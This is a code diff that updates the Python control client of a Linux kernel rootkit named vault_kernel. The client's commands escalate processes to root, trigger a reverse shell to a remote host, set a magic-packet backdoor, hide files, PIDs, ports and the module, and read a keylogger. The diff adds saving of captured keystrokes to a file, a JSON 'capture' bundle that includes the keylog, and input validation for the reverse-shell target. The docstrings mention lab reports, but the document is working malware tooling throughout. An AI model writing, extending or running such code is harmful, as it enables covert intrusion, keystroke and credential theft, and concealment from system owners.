@@ -19,9 +19,10 @@ Commands:
     give-root [pid]       Escalate a process to root (default: self)
     shell <ip:port>       Trigger reverse shell to remote host
     magic <word>          Set magic packet trigger word
-    keylog [--follow] [--interval MS]
+    keylog [--follow] [--interval MS] [--output FILE]
                           Read captured keystrokes (stream with --follow)
     keylog-clear          Clear the keylogger buffer
+    capture [--out FILE]  Evidence bundle: stats + hidden + keylog as JSON
     hide-module           Hide rootkit from lsmod
     unhide-module         Make rootkit visible in lsmod
     reset                 Clear ALL hidden files, PIDs and ports
@@ -43,7 +44,7 @@ import argparse
 MAGIC = 0xC0
 DEVICE_PATH = "/dev/vault_kernel"
 SYSFS_MODULE = "/sys/module/vault_kernel"
-CLIENT_VERSION = "3.8"
+CLIENT_VERSION = "3.9"
 
 
 def _port_arg(value):
@@ -56,6 +57,46 @@ def _port_arg(value):
         raise argparse.ArgumentTypeError(
             f"port must be in 1-65535, got {iv}")
     return iv
+
+
+def _pid_arg(value):
+    """argparse type: a REAL pid for hide-pid/unhide-pid (>= 1).
+    v3.9 parity with the Go parsePIDArg: 0/negative PIDs used to reach
+    the module and be stored verbatim in the hide-list ("pid: -5"),
+    entries that nothing can ever match (hooked_kill filters pid > 0
+    only).  give-root keeps its own contract (pid <= 0 = self)."""
+    try:
+        iv = int(value)
+    except ValueError:
+        raise argparse.ArgumentTypeError(f"invalid PID: {value!r}")
+    if iv < 1:
+        raise argparse.ArgumentTypeError(
+            f"PID must be >= 1, got {iv}")
+    return iv
+
+
+def _shell_target_arg(value):
+    """argparse type: `ip:port` for the reverse-shell trigger.
+    v3.9 parity with the Go parseShellTarget: exactly ONE colon
+    (the module splits at the first, so IPv6/garbage with 2+ colons
+    is rejected client-side), non-empty host, numeric port 1-65535.
+    Until now the Python CLI validated NOTHING here."""
+    if value.count(":") != 1:
+        raise argparse.ArgumentTypeError(
+            f"invalid target {value!r}: use ip:port (IPv6 not supported)")
+    host, _, port = value.partition(":")
+    if not host:
+        raise argparse.ArgumentTypeError(
+            f"invalid target {value!r}: empty host")
+    try:
+        pv = int(port)
+    except ValueError:
+        raise argparse.ArgumentTypeError(
+            f"invalid port in target {value!r}: {port!r}")
+    if not 1 <= pv <= 65535:
+        raise argparse.ArgumentTypeError(
+            f"invalid port in target {value!r}: {port} (must be 1-65535)")
+    return value
 
 # Standard Linux ioctl layout (uapi/asm-generic/ioctl.h):
 #   bits 31:30 = direction  (0=none, 1=write, 2=read)
@@ -232,6 +273,39 @@ def parse_hidden_list(report: str) -> dict:
         elif section == "files":
             result["files"].append(stripped)
     return result
+
+
+def build_capture_bundle(stats_raw: dict, hidden: dict, keylog_text: str,
+                         captured_at: str, module_in_sysfs: bool,
+                         client_version: str = CLIENT_VERSION) -> dict:
+    """Build the `capture` evidence bundle — mirrors buildCaptureReport()
+    in the Go client (v3.9, contract pinned by tests in BOTH clients).
+
+    One JSON document freezing the module state for a lab report:
+    envelope keys in contractual order (schema, captured_at,
+    client_version, module_in_sysfs, stats, hidden, keylog), stats
+    reusing the `stats --json` numeric conversion with keys sorted
+    (Go's JSON encoder sorts map keys — the mirror keeps parity),
+    keylog text verbatim.  captured_at is the UTC RFC3339 instant of
+    the SNAPSHOT, taken after the buffers were read.
+    """
+    stats = {}
+    for key in sorted(stats_raw):
+        try:
+            stats[key] = int(stats_raw[key])
+        except ValueError:
+            stats[key] = stats_raw[key]
+    return {
+        "schema": JSON_SCHEMA_VERSION,
+        "captured_at": captured_at,
+        "client_version": client_version,
+        "module_in_sysfs": module_in_sysfs,
+        "stats": stats,
+        "hidden": {"pids": hidden.get("pids", []),
+                   "files": hidden.get("files", []),
+                   "ports": hidden.get("ports", [])},
+        "keylog": keylog_text,
+    }
 
 
 def format_watch_panel(stats: dict, hidden: dict, interval_ms: int,
@@ -571,17 +645,39 @@ class VaultKernelClient:
             print(f"[+] Magic packet backdoor enabled: '{word}'")
         self._close()
 
-    def keylog_read(self, follow=False, interval=None, timestamps=False):
+    def keylog_read(self, follow=False, interval=None, timestamps=False,
+                    output=None):
         """Read captured keystrokes; with follow=True, stream new
         keystrokes until Ctrl-C.  The module's buffer shifts left when
         full, so a suffix diff is printed while the common prefix
         holds and a full replay when it wraps.  With timestamps=True
         (follow only) each event is prefixed with the poll time — see
         format_keylog_event.  `interval` is in SECONDS internally
-        (None = documented default of 500 ms)."""
+        (None = documented default of 500 ms).  With output=PATH (v3.9)
+        every event is ALSO appended to the file and flushed — the
+        exact bytes printed to the terminal (timestamps included),
+        created 0600 because captures may contain keystrokes; a
+        one-shot writes the buffer as one record when non-empty."""
         if interval is None:
             interval = _interval_ms_to_seconds(KEYLOG_DEFAULT_INTERVAL_MS)
         self._open()
+        sink = None
+
+        def _ensure_sink():
+            """Lazy-open the output file (0600, append) on the FIRST
+            record only — an empty one-shot buffer creates NO file,
+            matching the Go keylogSink semantics."""
+            nonlocal sink
+            if sink is None:
+                try:
+                    sink = open(output, "a", encoding="utf-8", opener=
+                                lambda p, flags: os.open(
+                                    p, flags | os.O_APPEND, 0o600))
+                except OSError as e:
+                    raise SystemExit(
+                        f"[-] cannot open keylog output {output}: {e}")
+            return sink
+
         prev = ""
         try:
             while True:
@@ -589,26 +685,33 @@ class VaultKernelClient:
                 if not self._ioctl(IOCTL_KEYLOG_READ, buf):
                     break
                 cur = buf.rstrip(b'\x00').decode(errors='replace')
-                if cur != prev:
-                    if follow:
-                        if len(cur) >= len(prev) and cur.startswith(prev):
-                            new_text, wrapped = cur[len(prev):], False
-                        else:
-                            new_text, wrapped = cur, True
-                        print(format_keylog_event(
-                            new_text,
-                            time.strftime("%H:%M:%S") if timestamps else None,
-                            wrapped), end='', flush=True)
-                        prev = cur
-                    else:
-                        print(f"[*] Keystroke log:\n{cur}" if cur
-                              else "[*] (no keystrokes captured)")
                 if not follow:
+                    print(f"[*] Keystroke log:\n{cur}" if cur
+                          else "[*] (no keystrokes captured)")
+                    if output and cur:
+                        _ensure_sink().write(cur + "\n")
+                        sink.flush()
                     break
+                if cur != prev:
+                    if len(cur) >= len(prev) and cur.startswith(prev):
+                        new_text, wrapped = cur[len(prev):], False
+                    else:
+                        new_text, wrapped = cur, True
+                    event = format_keylog_event(
+                        new_text,
+                        time.strftime("%H:%M:%S") if timestamps else None,
+                        wrapped)
+                    print(event, end='', flush=True)
+                    if output:
+                        _ensure_sink().write(event + "\n")
+                        sink.flush()
+                    prev = cur
                 time.sleep(interval)
         except KeyboardInterrupt:
             print("\n[*] Follow stopped")
         finally:
+            if sink is not None:
+                sink.close()
             self._close()
 
     def keylog_clear(self):
@@ -721,6 +824,47 @@ class VaultKernelClient:
         print(f"[*] Encoded PID: {encoded}")
         print(f"[*] Trigger    : kill -s {MAGIC_SIGNAL} {encoded}")
 
+    def capture(self, out=None):
+        """Evidence bundle (v3.9): read stats, the hidden list and the
+        keylog buffer in one pass and emit the `capture` JSON document
+        — mirrors runCapture in the Go client.  With out=PATH the file
+        is written 0600 (captures may contain keystrokes) and a
+        one-line summary goes to stdout; without it the JSON goes to
+        stdout like the other --json commands."""
+        self._open()
+        try:
+            stats_buf = bytearray(4096)
+            if not self._ioctl(IOCTL_GET_STATS, stats_buf):
+                raise SystemExit("[-] capture: GET_STATS failed")
+            list_buf = bytearray(4096)
+            if not self._ioctl(IOCTL_LIST_HIDDEN, list_buf):
+                raise SystemExit("[-] capture: LIST_HIDDEN failed")
+            key_buf = bytearray(4096)
+            if not self._ioctl(IOCTL_KEYLOG_READ, key_buf):
+                raise SystemExit("[-] capture: KEYLOG_READ failed")
+
+            stats_raw = parse_stats_report(
+                stats_buf.rstrip(b'\x00').decode(errors='replace'))
+            hidden = parse_hidden_list(
+                list_buf.rstrip(b'\x00').decode(errors='replace'))
+            keylog_text = key_buf.rstrip(b'\x00').decode(errors='replace')
+            bundle = build_capture_bundle(
+                stats_raw, hidden, keylog_text,
+                time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+                os.path.isdir(SYSFS_MODULE))
+            payload = json.dumps(bundle, indent=2)
+            if out:
+                fd = os.open(out, os.O_WRONLY | os.O_CREAT | os.O_TRUNC,
+                             0o600)
+                with os.fdopen(fd, "w", encoding="utf-8") as fh:
+                    fh.write(payload + "\n")
+                print(f"[+] Evidence bundle written to {out} "
+                      f"({len(payload) + 1} bytes)")
+            else:
+                print(payload)
+        finally:
+            self._close()
+
 
 def main():
     parser = argparse.ArgumentParser(
@@ -746,10 +890,10 @@ def main():
     sp.add_argument("name", help="File or directory name")
 
     sp = subparsers.add_parser("hide-pid", help="Hide a process")
-    sp.add_argument("pid", type=int, help="Process ID")
+    sp.add_argument("pid", type=_pid_arg, help="Process ID (>= 1)")
 
     sp = subparsers.add_parser("unhide-pid", help="Reveal a hidden process")
-    sp.add_argument("pid", type=int, help="Process ID")
+    sp.add_argument("pid", type=_pid_arg, help="Process ID (>= 1)")
 
     sp = subparsers.add_parser("hide-port", help="Hide a TCP/UDP port")
     sp.add_argument("port", type=_port_arg, help="Port number (1-65535)")
@@ -771,7 +915,8 @@ def main():
                     help="refresh interval in ms (default 1000, min 50)")
 
     sp = subparsers.add_parser("shell", help="Trigger reverse shell")
-    sp.add_argument("target", help="IP:PORT for reverse shell")
+    sp.add_argument("target", type=_shell_target_arg,
+                    help="IP:PORT for reverse shell")
 
     sp = subparsers.add_parser("magic", help="Set magic packet trigger word")
     sp.add_argument("word", help="Trigger word")
@@ -789,6 +934,14 @@ def main():
     sp.add_argument("--interval", type=_ms_arg,
                     default=KEYLOG_DEFAULT_INTERVAL_MS, metavar="MS",
                     help="poll interval in ms for --follow (default 500, min 50)")
+    sp.add_argument("--output", default=None, metavar="FILE",
+                    help="also append every event to FILE (created 0600, "
+                         "flushed per event)")
+    sp = subparsers.add_parser(
+        "capture", help="Evidence bundle: stats + hidden + keylog as JSON")
+    sp.add_argument("--out", default=None, metavar="FILE",
+                    help="write the bundle to FILE (created 0600) "
+                         "instead of stdout")
     subparsers.add_parser("keylog-clear", help="Clear keylogger buffer")
     subparsers.add_parser("version", help="Print client version and ioctl ABI")
     subparsers.add_parser("hide-module", help="Hide from lsmod")
@@ -847,7 +1000,10 @@ def main():
             # _interval_ms_to_seconds clamps to the 50 ms floor.
             interval = _interval_ms_to_seconds(args.interval)
             client.keylog_read(follow=args.follow, interval=interval,
-                               timestamps=args.timestamps)
+                               timestamps=args.timestamps,
+                               output=args.output)
+        elif args.command == "capture":
+            client.capture(out=args.out)
         elif args.command == "keylog-clear":
             client.keylog_clear()
         elif args.command == "hide-module":
